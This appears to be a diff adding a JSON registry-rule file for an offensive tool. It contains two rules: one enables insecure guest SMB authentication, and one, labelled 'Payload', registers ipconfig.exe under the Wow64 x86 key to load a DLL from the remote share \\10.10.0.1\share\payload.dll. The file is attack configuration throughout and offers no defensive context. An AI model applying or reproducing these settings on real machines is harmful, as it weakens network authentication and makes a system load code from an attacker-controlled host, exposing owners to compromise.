@@ -1,0 +1,18 @@
+[
+    {
+        "rulename": "AllowInsecureGuestAuth",
+        "subkey": "SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters",
+        "regname": "AllowInsecureGuestAuth",
+        "hive": "HKEY_LOCAL_MACHINE",
+        "value": 1,
+        "type": "DWORD"
+    },
+    {
+        "rulename": "Payload",
+        "subkey": "SOFTWARE\\Microsoft\\Wow64\\x86",
+        "regname": "ipconfig.exe",
+        "hive": "HKEY_LOCAL_MACHINE",
+        "value": "\\\\10.10.0.1\\share\\payload.dll",
+        "type": "String"
+    }
+]
